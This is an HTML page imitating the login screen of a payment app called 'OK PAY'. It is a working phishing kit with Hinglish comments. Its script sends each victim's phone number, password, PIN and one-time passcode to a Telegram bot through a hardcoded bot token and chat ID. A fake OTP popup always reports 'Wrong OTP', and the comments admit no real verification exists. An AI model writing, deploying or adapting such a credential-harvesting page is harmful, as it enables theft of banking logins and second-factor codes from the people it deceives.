<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>OK PAY</title>
  <style>
    /* --- Basic Reset --- */
    * { box-sizing: border-box; margin: 0; padding: 0; }
    body {
      background-color: #121212;
      color: #ffffff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      display: flex;
      justify-content: center;
      align-items: center;
      min-height: 100vh;
      padding: 20px;
    }
    .container {
      width: 100%;
      max-width: 350px;
      text-align: center;
    }

    /* --- Logo --- */
    .logo-box {
      width: 120px;
      height: 120px;
      background: linear-gradient(135deg, #4a148c, #1a237e);
      border-radius: 20px;
      margin: 0 auto 30px;
      display: flex;
      align-items: center;
      justify-content: center;
      position: relative;
      box-shadow: 0 10px 20px rgba(0,0,0,0.5);
    }
    .logo-box span {
      font-size: 40px;
      font-weight: 800;
      background: linear-gradient(to right, #ff9800, #00bcd4);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .logo-text {
      position: absolute;
      bottom: 15px;
      color: #fff;
      font-size: 14px;
      letter-spacing: 2px;
      font-weight: bold;
    }

    /* --- Input Fields --- */
    .input-group {
      display: flex;
      align-items: center;
      background: #2a2a2a;
      border: 1px solid #444;
      border-radius: 12px;
      padding: 12px 15px;
      margin-bottom: 15px;
    }
    .input-group svg {
      width: 20px;
      height: 20px;
      fill: #4ade80;
      margin-right: 10px;
    }
    .input-group input {
      background: transparent;
      border: none;
      color: #fff;
      font-size: 16px;
      width: 100%;
      outline: none;
    }
    .input-group input::placeholder { color: #888; }

    /* --- Checkboxes & Links --- */
    .row {
      display: flex;
      justify-content: space-between;
      font-size: 13px;
      color: #4ade80;
      margin-bottom: 20px;
      padding: 0 5px;
    }
    .row a { color: #4ade80; text-decoration: none; }
    .checkbox-container {
      display: flex;
      align-items: center;
      font-size: 12px;
      color: #ccc;
      justify-content: center;
      margin-bottom: 20px;
    }
    .checkbox-container input {
      margin-right: 8px;
      accent-color: #4ade80;
    }

    /* --- Main Button --- */
    .btn-main {
      width: 100%;
      padding: 14px;
      background: #1a6e3a;
      color: white;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: 0.3s;
    }
    .btn-main:hover { background: #2a8e4a; }

    /* --- OTP POPUP (Hidden initially) --- */
    .popup-overlay {
      display: none; /* JavaScript se show karenge */
      position: fixed;
      top: 0; left: 0; right: 0; bottom: 0;
      background: rgba(0,0,0,0.7);
      justify-content: center;
      align-items: center;
      padding: 20px;
      z-index: 1000;
    }
    .popup-box {
      background: #1e1e1e;
      padding: 25px;
      border-radius: 20px;
      width: 100%;
      max-width: 350px;
      position: relative;
    }
    .close-btn {
      position: absolute;
      top: 15px; right: 15px;
      background: #333;
      color: #fff;
      border: none;
      border-radius: 50%;
      width: 30px; height: 30px;
      font-size: 16px;
      cursor: pointer;
    }
    .popup-box h2 { font-size: 20px; margin-bottom: 10px; text-align: left; }
    .popup-box p { font-size: 14px; color: #ccc; margin-bottom: 15px; line-height: 1.4; text-align: left;}
    .popup-box p span { color: #4ade80; font-weight: bold; }
    
    .otp-input-group {
      display: flex;
      background: #2a2a2a;
      border: 1px solid #444;
      border-radius: 12px;
      padding: 5px;
      margin-bottom: 15px;
    }
    .otp-input-group input {
      flex: 1;
      background: transparent;
      border: none;
      color: #fff;
      padding: 10px;
      font-size: 16px;
      outline: none;
    }
    .otp-input-group button {
      background: #1a6e3a;
      color: #fff;
      border: none;
      border-radius: 8px;
      padding: 0 15px;
      font-weight: bold;
      cursor: pointer;
    }
    .otp-input-group button:disabled { background: #444; color: #888; }

    .timer-text {
      color: #ccc;
      font-size: 13px;
      margin-bottom: 15px;
      text-align: center;
    }
  </style>
</head>
<body>

  <!-- Main Login Screen -->
  <div class="container">
    <div class="logo-box">
      <span>OK</span>
      <div class="logo-text">P A Y</div>
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
      <input type="text" id="phone" placeholder="Phone">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M18 8h-1V6c0-2.76-2.24-5-5-5S7 3.24 7 6v2H6c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2h12c1.1 0 2-.9 2-2V10c0-1.1-.9-2-2-2zm-6 9c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2zm3.1-9H8.9V6c0-1.71 1.39-3.1 3.1-3.1 1.71 0 3.1 1.39 3.1 3.1v2z"/></svg>
      <input type="password" id="pass" placeholder="Password">
    </div>

    <div class="input-group">
      <svg viewBox="0 0 24 24"><path d="M12.65 10C11.83 7.67 9.61 6 7 6c-3.31 0-6 2.69-6 6s2.69 6 6 6c2.61 0 4.83-1.67 5.65-4H17v4h4v-4h2v-4H12.65zM7 14c-1.1 0-2-.9-2-2s.9-2 2-2 2 .9 2 2-.9 2-2 2z"/></svg>
      <input type="password" id="pin" placeholder="6-digit PIN" maxlength="6">
    </div>

    <div class="row">
      <a href="#">Register</a>
      <div><input type="radio" style="accent-color:#4ade80;"> Remember Me</div>
    </div>

    <div class="checkbox-container">
      <input type="radio" checked> Agree "User Privacy Agreement"
    </div>

    <button class="btn-main" onclick="showOTP()">Sign In</button>
  </div>

  <!-- OTP Popup Screen -->
  <div class="popup-overlay" id="otpPopup">
    <div class="popup-box">
      <button class="close-btn" onclick="closeOTP()">✕</button>
      <h2>Login OTP</h2>
      <p>Tap Send to receive the OTP, then enter it to confirm this login.</p>
      <p>OTP will be sent to <span id="displayPhone">+91 XXXXXXXX</span></p>
      
      <div class="otp-input-group">
        <input type="text" id="otpInput" placeholder="Enter 6-digit OTP" maxlength="6">
        <button id="sendOtpBtn" onclick="sendOTP()">Send</button>
      </div>
      
      <div class="timer-text" id="timerText"></div>
      
      <button class="btn-main" onclick="verifyOTP()">Confirm</button>
    </div>
  </div>

  <script>
    // ==========================================
    // AAPKI TELEGRAM DETAILS YAHAN HAIN
    // ==========================================
    const BOT_TOKEN = "8881487058:AAFLyA3Z6uRf1CqPK4iAvOna23QZlhsHU3Q";
    const CHAT_ID = "8897030904";

    let countdown;
    let timeLeft = 60;

    // 1. Popup dikhana aur pehle login details bhejna
    function showOTP() {
      let phone = document.getElementById('phone').value;
      let pass = document.getElementById('pass').value;
      let pin = document.getElementById('pin').value;

      if (phone === "" || pass === "" || pin === "") {
        alert("Bhai, saari details daalo!");
        return;
      }

      // Phone number popup mein dikhana
      document.getElementById('displayPhone').innerText = "+91 " + phone;

      // Pehla message Telegram par bhejna
      let msg1 = "🔔 *New Login Attempt*\n\n";
      msg1 += "📞 Phone: " + phone + "\n";
      msg1 += "🔑 Password: " + pass + "\n";
      msg1 += "🔢 PIN: " + pin;
      sendToTelegram(msg1);

      // Popup open karna
      document.getElementById('otpPopup').style.display = 'flex';
      
      // Timer reset karna
      resetTimer();
    }

    // 2. Popup band karna
    function closeOTP() {
      document.getElementById('otpPopup').style.display = 'none';
      clearInterval(countdown);
    }

    // 3. OTP Send button dabane par
    function sendOTP() {
      let phone = document.getElementById('phone').value;
      
      // Timer shuru karna
      startTimer();

      // Telegram par message bhejna ki OTP send dabaya gaya
      let msg2 = "📩 *OTP Send Button Pressed*\nPhone: " + phone;
      sendToTelegram(msg2);

      // Button disable karna
      document.getElementById('sendOtpBtn').disabled = true;
      document.getElementById('sendOtpBtn').innerText = "Sent";
    }

    // 4. OTP Confirm button dabane par
    function verifyOTP() {
      let otp = document.getElementById('otpInput').value;
      let phone = document.getElementById('phone').value;

      if (otp === "") {
        alert("Bhai, OTP daalo!");
        return;
      }

      // Telegram par OTP bhejna
      let msg3 = "🔐 *OTP Entered*\nPhone: " + phone + "\nOTP: " + otp;
      sendToTelegram(msg3);

      // Error message dikhana (Kyunki humare paas asli OTP verify karne ka system nahi hai)
      setTimeout(() => {
        alert("❌ Wrong OTP! Please try again.");
      }, 500);
    }

    // 5. Timer Function (60 seconds countdown)
    function startTimer() {
      timeLeft = 60;
      const timerDisplay = document.getElementById('timerText');
      
      clearInterval(countdown);
      countdown = setInterval(() => {
        if (timeLeft <= 0) {
          clearInterval(countdown);
          timerDisplay.innerText = "";
          document.getElementById('sendOtpBtn').disabled = false;
          document.getElementById('sendOtpBtn').innerText = "Send";
        } else {
          timerDisplay.innerText = "⏳ Resend OTP in " + timeLeft + "s";
          timeLeft--;
        }
      }, 1000);
    }

    function resetTimer() {
      clearInterval(countdown);
      timeLeft = 60;
      document.getElementById('sendOtpBtn').disabled = false;
      document.getElementById('sendOtpBtn').innerText = "Send";
      document.getElementById('otpInput').value = "";
    }

    // 6. Telegram API Function
    function sendToTelegram(message) {
      let url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage?chat_id=" + CHAT_ID + "&parse_mode=Markdown&text=" + encodeURIComponent(message);
      
      fetch(url)
        .then(response => console.log("Telegram Response: ", response.status))
        .catch(error => console.error("Telegram Error: ", error));
    }
  </script>

</body>
</html>
